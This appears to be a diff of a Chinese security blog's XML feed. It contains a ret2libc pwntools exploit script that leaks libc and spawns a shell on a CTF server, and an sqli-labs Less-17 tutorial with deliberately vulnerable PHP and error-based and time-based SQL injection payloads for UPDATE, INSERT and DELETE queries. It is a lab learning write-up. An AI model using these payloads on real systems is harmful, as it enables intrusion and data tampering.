-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/13.png" alt><br>注意，当延时注入成功后，需要修改插入的id数据,防止出现主键唯一性冲突。<br>2、delete下的注入：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">布尔注入：</span><br><span class="line">delete from Rj45 where id=0 and updatexml(1,(concat(0x7e,(select database()),0x7e)),1);</span><br><span class="line"></span><br><span class="line">延时注入：</span><br><span class="line">delete from Rj45 where id=3 and if((ord(left((select database()),1))=ascii(&apos;C&apos;)),sleep(5),0);</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/14.png" alt></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>1、mysql注入天书<br>2、php手册<br><a href="https://www.php.net/manual/zh/" target="_blank" rel="noopener">https://www.php.net/manual/zh/</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>深入理解ret2libc</title>
     <url>/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/</url>
     <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>针对ret2libc内一类需要计算地址的题型。</p>
@@ -3753,6 +3785,47 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = 0x88+4</span><br><span class="line">p = remote(&apos;111.198.29.45&apos;,36318)</span><br><span class="line">elf = ELF(&apos;./level3&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line">first_addr = elf.symbols[&apos;vulnerable_function&apos;]</span><br><span class="line">output_plt_addr = elf.plt[&apos;write&apos;]</span><br><span class="line">link_got_addr = elf.got[&apos;write&apos;]</span><br><span class="line">payload1 = flat([&apos;\x90&apos;*offset,output_plt_addr,first_addr,1,link_got_addr,4])</span><br><span class="line">p.sendlineafter(&quot;Input:\n&quot;,payload1)</span><br><span class="line">link_addr = u32(p.recv(4))</span><br><span class="line">link_libc_addr = libc.symbols[&apos;write&apos;]</span><br><span class="line">system_libc_addr = libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_libc_addr = libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">libc_base = link_addr - link_libc_addr</span><br><span class="line">system_addr = libc_base+system_libc_addr</span><br><span class="line">binsh_addr = libc_base+binsh_libc_addr</span><br><span class="line">payload2 = flat([&apos;\x90&apos;*offset,system_addr,0xdeadbeef,binsh_addr])</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><img src="/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/image-20191219010627434.png" alt="image-20191219010627434"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>由sqli-labs-Less17学习增删改形式下的sql注入</title>
+    <url>/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>mysql在对数据的处理中有增删改查四个操作。<br>而在sql注入中，往往常见的是<code>select</code>查询形式。<br>那么insert、delete、update呢？</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>在ubuntu下搭建docker和开源vulstudy项目（其内含sqli-labs环境）。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update -y</span><br><span class="line">sudo apt-get install docker.io -y</span><br><span class="line">sudo apt-get docker-compose -y</span><br><span class="line">sudo apt-get git -y</span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">sudo service docker restart</span><br><span class="line">git clone https://github.com/c0ny1/vulstudy.git</span><br><span class="line">cd /vulstudy/sqli-labs</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>1、增</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into table_name(column_name1,column_name2)values(&apos;value1&apos;,&apos;value2&apos;);</span><br><span class="line">insert into table_name values(&apos;value1&apos;,&apos;value2&apos;);</span><br><span class="line">insert into table_name set column_name1=&apos;value1&apos;,column_name2=&apos;value2&apos;;</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/1.png" alt><br>2、删</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete from table_name where column_name=&apos;value&apos;;</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/2.png" alt><br>3、改</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=&apos;value2&apos; where column_name2=&apos;value2&apos;;</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/3.png" alt></p>
+<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>sqli-labs-Less17代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function check_input($value)</span><br><span class="line">	&#123;</span><br><span class="line">	if(!empty($value))</span><br><span class="line">		&#123;</span><br><span class="line">		// truncation (see comments)</span><br><span class="line">		$value = substr($value,0,15);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Stripslashes if magic quotes enabled</span><br><span class="line">		if (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		// Quote if not a number</span><br><span class="line">		if (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	return $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">// take the variables</span><br><span class="line">if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">//making sure uname is not injectable</span><br><span class="line">$uname=check_input($_POST[&apos;uname&apos;]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[&apos;passwd&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;);</span><br><span class="line">fwrite($fp,&apos;New Password:&apos;.$passwd.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity</span><br><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">//echo $row;</span><br><span class="line">	if($row)</span><br><span class="line">	&#123;</span><br><span class="line">  		//echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;;</span><br><span class="line">		$row1 = $row[&apos;username&apos;];  	</span><br><span class="line">		//echo &apos;Your Login name:&apos;. $row1;</span><br><span class="line">		$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;</span><br><span class="line">		mysql_query($update);</span><br><span class="line">  		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">		if (mysql_error())</span><br><span class="line">		&#123;</span><br><span class="line">			echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">			print_r(mysql_error());</span><br><span class="line">			echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">			//echo &quot; You password has been successfully updated &quot; ;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		echo &apos;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&apos;;</span><br><span class="line">		//echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">  	&#125;</span><br><span class="line">	else  </span><br><span class="line">	&#123;</span><br><span class="line">		echo &apos;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">		//echo &quot;Bug off you Silly Dumb hacker&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&apos;;</span><br><span class="line"></span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>1、代码审计：<br>使用check_input函数对输入数据进行过滤，<br>接着以用户名作为条件查询数据库，<br>当查询到数据库存在记录时，更新该密码。<br>这是一个密码重置功能的代码。<br>然而在对输入数据进行过滤的过程中，清洗了用户名，却没有清洗密码，<br>由此导致了sql注入。</p>
+<p>2、check_input函数功能：<br>截取输入的数据中前15个字符，<br>检测服务端是否开启<code>magic_quotes_gpc</code>转义，如果有则删除反斜杠，<br>检测字符串中是否都是数字字符，如果不存在则对特定添加反斜杠，同时以单引号闭合数据，<br>如果都是数字字符，则将其转化为整数。</p>
+<p>3、函数解释：<br>get_magic_quotes_gpc()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/4.png" alt></p>
+<p>stripslashes()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/5.png" alt></p>
+<p>ctype_digit()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/6.png" alt></p>
+<p>mysql_real_escape_string()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/7.png" alt></p>
+<p>intval()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/8.png" alt></p>
+<p>addslashes()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/9.png" alt></p>
+<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><p>在注入点位置的报错注入与延时注入：<br>没有数据回显<del>联合注入取消</del>，没有布尔回显<del>布尔盲注取消</del></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/10.png" alt><br>1、报错注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&apos;) and updatexml(1,(concat(0x7e,(select database()),0x7e)),1)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/11.png" alt><br>2、延时盲注</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&apos;) and if((ord(left((select database()),1))=ascii(&apos;s&apos;)),sleep(1),0)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>payload自行调整。</p>
+<h1 id="延伸"><a href="#延伸" class="headerlink" title="延伸"></a>延伸</h1><p>上述为update下的注入。<br>由于update、insert和delete三者应用场景的特殊性，<br>一般不会有数据回显，故一般选取布尔注入和延时注入。<br>1、insert下的注入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">布尔注入：</span><br><span class="line">insert into Rj45(id,word)values(3,updatexml(1,(concat(0x7e,(select database()),0x7e)),1));</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/12.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">延时注入：</span><br><span class="line">insert into Rj45(id,word)values(5,if((ord(left((select database()),1))=ascii(&apos;C&apos;)),sleep(5),0));</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/13.png" alt><br>注意，当延时注入成功后，需要修改插入的id数据,防止出现主键唯一性冲突。<br>2、delete下的注入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">布尔注入：</span><br><span class="line">delete from Rj45 where id=0 and updatexml(1,(concat(0x7e,(select database()),0x7e)),1);</span><br><span class="line"></span><br><span class="line">延时注入：</span><br><span class="line">delete from Rj45 where id=3 and if((ord(left((select database()),1))=ascii(&apos;C&apos;)),sleep(5),0);</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/14.png" alt></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>1、mysql注入天书<br>2、php手册<br><a href="https://www.php.net/manual/zh/" target="_blank" rel="noopener">https://www.php.net/manual/zh/</a></p>
 ]]></content>
   </entry>
   <entry>
